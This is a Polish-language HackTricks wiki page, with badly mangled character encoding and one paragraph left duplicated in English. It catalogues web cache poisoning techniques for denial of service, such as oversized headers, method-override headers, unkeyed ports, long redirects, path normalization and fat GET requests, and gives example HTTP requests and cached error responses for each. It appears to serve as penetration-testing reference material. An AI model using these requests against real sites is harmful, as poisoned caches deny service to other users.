# Cache Poisoning to DoS

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the**  [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter**  [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

{% hint style="danger" %}
Na tej stronie znajdziesz r贸偶ne warianty, aby spr贸bowa sprawi, by **serwer WWW odpowiada bdami** na 偶dania, kt贸re s **wa偶ne dla serwer贸w cache**
{% endhint %}

* **HTTP Header Oversize (HHO)**

Wylij 偶danie z rozmiarem nag贸wka wikszym ni偶 ten obsugiwany przez serwer WWW, ale mniejszym ni偶 ten obsugiwany przez serwer cache. Serwer WWW odpowie kodem 400, kt贸ry mo偶e by zbuforowany:
```
GET / HTTP/1.1
Host: redacted.com
X-Oversize-Hedear:Big-Value-000000000000000
```
* **HTTP Meta Character (HMC) & Unexpected values**

Wylij nag贸wek, kt贸ry zawiera **szkodliwe znaki meta** takie jak <i> i <b>. Aby atak zadziaa, musisz najpierw obej pami podrczn.
```
GET / HTTP/1.1
Host: redacted.com
X-Meta-Hedear:Bad Chars\n \r
```
A badly configured header could be just `\:` as a header.

This could also work if unexpected values are sent, like an unexpected Content-Type:  
殴le skonfigurowany nag贸wek m贸gby by po prostu `\:` jako nag贸wek.

To mo偶e r贸wnie偶 dziaa, jeli wysyane s nieoczekiwane wartoci, takie jak nieoczekiwany Content-Type:
```
GET /anas/repos HTTP/2
Host: redacted.com
Content-Type: HelloWorld
```
* **Unkeyed header**

Niekt贸re strony internetowe zwr贸c kod statusu bdu, jeli **zobacz niekt贸re konkretne nag贸wki** w 偶daniu, jak w przypadku nag贸wka _X-Amz-Website-Location-Redirect: someThing_:
```
GET /app.js HTTP/2
Host: redacted.com
X-Amz-Website-Location-Redirect: someThing

HTTP/2 403 Forbidden
Cache: hit

Invalid Header
```
* **HTTP Method Override Attack (HMO)**

Jeli serwer obsuguje zmian metody HTTP za pomoc nag贸wk贸w takich jak `X-HTTP-Method-Override`, `X-HTTP-Method` lub `X-Method-Override`, mo偶liwe jest za偶danie wa偶nej strony, zmieniajc metod, aby serwer jej nie obsugiwa, co powoduje, 偶e za odpowied藕 jest buforowana:
```
GET /blogs HTTP/1.1
Host: redacted.com
HTTP-Method-Override: POST
```
* **Port bez klucza**

Jeli port w nag贸wku Host jest odzwierciedlany w odpowiedzi i nie jest uwzgldniony w kluczu pamici podrcznej, mo偶liwe jest przekierowanie go do nieu偶ywanego portu:
```
GET /index.html HTTP/1.1
Host: redacted.com:1

HTTP/1.1 301 Moved Permanently
Location: https://redacted.com:1/en/index.html
Cache: miss
```
* **Long Redirect DoS**

Jak w poni偶szym przykadzie, x nie jest buforowane, wic atakujcy mo偶e wykorzysta zachowanie odpowiedzi przekierowania, aby sprawi, 偶e przekierowanie wyle URL tak du偶, 偶e zwr贸ci bd. Wtedy osoby pr贸bujce uzyska dostp do URL bez niebuforowanego klucza x otrzymaj odpowied藕 z bdem:
```
GET /login?x=veryLongUrl HTTP/1.1
Host: www.cloudflare.com

HTTP/1.1 301 Moved Permanently
Location: /login/?x=veryLongUrl
Cache: hit

GET /login/?x=veryLongUrl HTTP/1.1
Host: www.cloudflare.com

HTTP/1.1 414 Request-URI Too Large
CF-Cache-Status: miss
```
* **Normalizacja wielkoci liter nag贸wka hosta**

Nag贸wek hosta powinien by niewra偶liwy na wielko liter, ale niekt贸re strony internetowe oczekuj, 偶e bdzie pisany maymi literami, zwracajc bd, jeli tak nie jest:
```
GET /img.png HTTP/1.1
Host: Cdn.redacted.com

HTTP/1.1 404 Not Found
Cache:miss

Not Found
```
* **Normalizacja cie偶ki**

Niekt贸re strony zwr贸c kody bd贸w, wysyajc dane URLencode w cie偶ce, jednak serwer cache z URLdecode cie偶k i zapisze odpowied藕 dla cie偶ki URLdecoded:
```
GET /api/v1%2e1/user HTTP/1.1
Host: redacted.com


HTTP/1.1 404 Not Found
Cach:miss

Not Found
```
* **Fat Get**

Niekt贸re serwery cache, takie jak Cloudflare, lub serwery webowe, zatrzymuj 偶dania GET z ciaem, wic mo偶na to wykorzysta do zbuforowania nieprawidowej odpowiedzi:
```
GET /index.html HTTP/2
Host: redacted.com
Content-Length: 3

xyz


HTTP/2 403 Forbidden
Cache: hit
```
## References

* [https://anasbetis023.medium.com/dont-trust-the-cache-exposing-web-cache-poisoning-and-deception-vulnerabilities-3a829f221f52](https://anasbetis023.medium.com/dont-trust-the-cache-exposing-web-cache-poisoning-and-deception-vulnerabilities-3a829f221f52)
* [https://youst.in/posts/cache-poisoning-at-scale/?source=post\_page-----3a829f221f52--------------------------------](https://youst.in/posts/cache-poisoning-at-scale/?source=post\_page-----3a829f221f52--------------------------------)

{% hint style="success" %}
Ucz si i wicz Hacking AWS:<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
Ucz si i wicz Hacking GCP: <img src="../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Wsparcie HackTricks</summary>

* Sprawd藕 [**plany subskrypcyjne**](https://github.com/sponsors/carlospolop)!
* **Docz do**  [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegram**](https://t.me/peass) lub **led藕** nas na **Twitterze**  [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Dziel si trikami hackingowymi, przesyajc PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytori贸w github.

</details>
{% endhint %}
